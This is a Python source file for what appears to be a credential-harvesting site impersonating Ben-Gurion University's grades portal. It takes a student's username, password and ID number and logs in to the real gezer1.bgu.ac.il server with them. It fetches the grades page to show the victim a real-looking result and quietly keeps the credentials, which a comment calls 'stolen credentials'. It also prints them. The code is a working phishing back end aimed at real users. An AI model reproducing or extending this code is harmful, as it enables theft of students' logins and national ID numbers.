import requests

from libs.utils import Singleton


class Logic(metaclass=Singleton):

    def __init__(self):
        self.users = {}

    # Renders list of courses grades for the client.
    def render_courses(self, username, password, identity, is_heb):
        session_id = self.get_session_id(username, password, identity)
        if session_id == -1:
            return is_heb

        headers = {
            "Referer": "https://gezer1.bgu.ac.il/meser/main.php",
            "Cookie": f"PHPSESSID={session_id}"
        }

        data = {
            "isheb": int(is_heb)
        }

        res = requests.post("https://gezer1.bgu.ac.il/meser/crslist.php", data=data, headers=headers).content
        res = res.decode("windows-1255").replace("<link href=\"n3style.css\" rel=\"Stylesheet\" type=\"text/css\">", "<link rel= \"stylesheet\" "
                                                                                                                     "type= \"text/css\" href= \"{{"
                                                                                                                     " url_for('static',"
                                                                                                                     "filename='styles/n3style.css"
                                                                                                                     "') }}\"> ")
        self.save(username, password, identity)

        # with open(f"website/templates/courses_{username}.html", "w+") as f:
        #     f.write(res)
        return f"courses_{username}.html"

    # Save client's credentials.
    def save(self, username, password, identity):
        if username not in self.users:
            self.users[username] = {"password": password, "id": identity}
            print(self.users)

    # Return list of stolen credentials.
    def get_credentials(self):
        return self.users

    # Get BGU server's session id (cookie) in order to serve authentic HTML pages.
    @staticmethod
    def get_session_id(username, password, identity):
        session = requests.Session()
        res = session.post("https://gezer1.bgu.ac.il/meser/main.php", data={"username": username, "pass": password, "id": identity}).content.decode(
            "windows-1255")

        if "errorfound" in res:
            return -1

        return session.cookies.get_dict()["PHPSESSID"]
